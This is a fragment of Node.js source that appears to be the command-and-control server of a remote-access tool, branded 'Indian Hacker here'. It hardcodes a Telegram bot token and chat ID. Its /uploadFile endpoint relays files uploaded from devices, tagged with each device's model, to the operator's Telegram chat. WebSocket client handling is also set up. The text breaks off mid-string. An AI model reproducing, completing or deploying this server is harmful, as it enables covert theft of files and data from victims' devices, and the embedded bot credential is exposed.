const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuid4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

const token = '7562542904:AAG4VPirL-KaxCEOE3-VJFG1NhsVfth0gxM'; // Replace with your Telegram bot token
const id = '7552684875'; // Replace with your Telegram chat ID
const address = 'https://www.google.com';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true }); // Use noServer option for manual upgrade handling
const bot = new TelegramBot(token, { polling: true });
const clients = new Map();

const upload = multer();
app.use(bodyParser.json());

// Environment variables for Render
const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';

// Root endpoint
app.get('/', (req, res) => {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">Indian Hacker here</p>');
});

// File upload endpoint
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    bot.sendDocument(id, req.file.buffer, {
        caption: `°• 𓃥𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫
